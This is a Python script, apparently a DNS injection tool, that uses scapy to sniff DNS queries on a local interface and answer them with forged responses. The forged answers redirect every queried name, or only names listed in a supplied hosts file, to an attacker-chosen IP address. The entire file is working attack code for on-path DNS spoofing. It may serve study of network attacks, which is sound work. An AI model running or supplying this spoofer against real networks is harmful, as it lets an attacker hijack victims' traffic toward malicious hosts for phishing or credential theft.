#!/usr/bin/env python
import argparse, sys, os
from scapy.all import *

def dns_inject(packet):
    if not packet.haslayer(DNS): return
    dopoison = False
    
    ip = packet.getlayer(IP)
    udp = packet.getlayer(UDP)
    dns = packet.getlayer(DNS)
    
    # check bpf filter
    if (expression) and (ip.src not in expression): return

    if dns.qr == 0:
        redirect = "192.168.43.53"
        if hostname:
            with open(hostname) as fp:
                pqname = packet[DNSQR].qname.decode(encoding='UTF-8')
                pqname = pqname[:-1] if pqname.endswith('.') else pqname
                print(pqname)
                for line in fp:
                    if pqname in line:
                        redirect = line.split()[0]
                        print("redirect:",redirect)
                        dopoison = True
        else: dopoison = True

        if dopoison:
            resp = IP(dst=ip.src, src=ip.dst)
            resp /= UDP(dport=udp.sport, sport=udp.dport)
            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=redirect))
            send(resp)
            print("Sent dns injection:", resp.summary())
        

def parse_options():
    parser = argparse.ArgumentParser(description="DNS inject tool.")
    parser.add_argument("-i", default="ens33")
    parser.add_argument("-f", default="")
    parser.add_argument('expression', nargs='*',action="store")
    args = parser.parse_args()

    return args.i, args.f, args.expression

if __name__ == '__main__':
    interface, hostname, expression = parse_options()
    try:
        print("hostname:", hostname, "\nexpression:", expression)
        if interface:
            print("interface:", interface)
            sniff(filter='udp port 53', iface=interface, prn=dns_inject)
        else:
            print("interface: ALL")
            sniff(filter='udp port 53', prn=dns_inject)

    except AttributeError:
        print("Invalid options. Please input in following format:")
        print("dnsinject [-i interface] [-f hostnames] expression")